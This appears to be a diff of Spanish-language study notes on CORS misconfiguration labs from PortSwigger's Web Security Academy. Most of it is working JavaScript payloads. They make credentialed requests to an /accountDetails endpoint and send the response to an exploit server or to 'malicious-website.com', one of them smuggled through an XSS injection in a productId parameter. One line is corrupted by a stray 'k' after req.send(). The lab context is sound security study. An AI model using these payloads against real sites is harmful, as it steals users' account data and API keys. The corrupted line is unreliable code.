@@ -9,7 +9,7 @@ var req = new XMLHttpRequest();
 req.onload = reqListener;
 req.open('get','https://0a5e001604755cf383449114000100a9.web-security-academy.net/accountDetails',true);
 req.withCredentials = true;
-req.send();
+req.send();k
 
 function reqListener() {
 	location='https://exploit-0a19000c04eb5cb7831d901401560077.exploit-server.net/exploit?key='+this.responseText;
@@ -32,3 +32,8 @@ location='malicious-website.com/log?key='+this.responseText;
 ```
 3. Bypasear el origin agregando nuestro dominio como sufijo o prefijo
 4. Cambiar https por http
+```
+<script>
+    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+```
